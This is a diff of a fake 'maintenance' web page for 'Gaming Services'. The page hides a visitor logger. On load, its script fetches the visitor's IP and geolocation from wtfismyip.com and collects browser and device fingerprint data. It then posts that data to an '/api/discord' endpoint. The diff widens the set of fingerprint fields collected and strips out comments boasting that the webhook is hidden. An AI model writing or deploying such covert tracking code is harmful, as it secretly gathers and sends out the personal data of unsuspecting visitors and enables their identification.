@@ -44,7 +44,7 @@
         Welcome. This website has been temporarily shut down for maintenance and updates.
       </p>
       <p>
-        We’re currently adding some big updates to the website. This process might take some time. Thank you for your patience.
+        We're currently adding some big updates to the website. This process might take some time. Thank you for your patience.
       </p>
       <p>
          
@@ -69,7 +69,6 @@
       &copy; 2025 Gaming Services. All rights reserved.
     </footer>
     <script>
-      // get out of here you cant get my webhook bro
       fetch("https://wtfismyip.com/json")
         .then((response) => response.json())
         .then((data) => {
@@ -109,16 +108,24 @@
             `Country: ${echolog.country}`,
             `Country Code: ${echolog.countryCode}`,
             `User Agent: ${echolog.userAgent}`,
-            `Window: ${echolog.windowWidth}x${echolog.windowHeight} (props ${echolog.windowProp})`,
-            `Screen: ${echolog.screenWidth}x${echolog.screenHeight} (DPR ${echolog.DPI})`,
-            `Orientation: ${echolog.orientation} / angle ${echolog.orientationAngle}`,
+            `Window Properties: ${echolog.windowProp}`,
+            `Window Width: ${echolog.windowWidth}`,
+            `Window Height: ${echolog.windowHeight}`,
+            `Window Ratio: ${echolog.windowRatio}`,
+            `Screen Width: ${echolog.screenWidth}`,
+            `Screen Height: ${echolog.screenHeight}`,
+            `Screen Ratio: ${echolog.screenRatio}`,
+            `DPI: ${echolog.DPI}`,
+            `Color Depth: ${echolog.colorDepth}`,
+            `Orientation: ${echolog.orientation}`,
+            `Orientation Angle: ${echolog.orientationAngle}`,
             `OS: ${echolog.os}`,
             `Threads: ${echolog.threads}`,
-            `Memory (GB): ${echolog.memory}`,
-            `Languages: ${echolog.systemLanguages}`,
+            `Memory: ${echolog.memory}`,
+            `System Languages: ${echolog.systemLanguages}`,
+            `Languages: ${echolog.languages}`,
           ].join("\n");
 
-          // bro get tf out of her you cant get my webhook
           fetch("/api/discord", {
             method: "POST",
             headers: {
